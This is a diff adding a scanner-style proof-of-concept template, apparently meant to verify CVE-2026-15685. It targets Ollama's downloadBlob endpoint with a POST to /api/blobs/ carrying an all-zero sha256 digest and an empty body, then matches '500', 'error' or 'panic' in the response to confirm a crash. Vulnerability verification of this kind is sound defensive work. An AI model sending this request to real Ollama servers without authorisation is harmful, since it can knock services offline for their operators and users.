@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "向 Ollama API 的 downloadBlob 端点发送特制请求，触发数组越界访问导致服务崩溃，验证 CVE-2026-15685 拒绝服务漏洞"
+id = "POC-AVE-2026-0501"
+name = "Ollama downloadBlob 数组索引验证不当拒绝服务漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2026-15685",
+    "ollama",
+    "dos",
+]
+vuln_id = [
+    "CVE-2026-15685",
+    "AVE-2026-0501",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/blobs/sha256:0000000000000000000000000000000000000000000000000000000000000000"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "error",
+    "panic",
+]
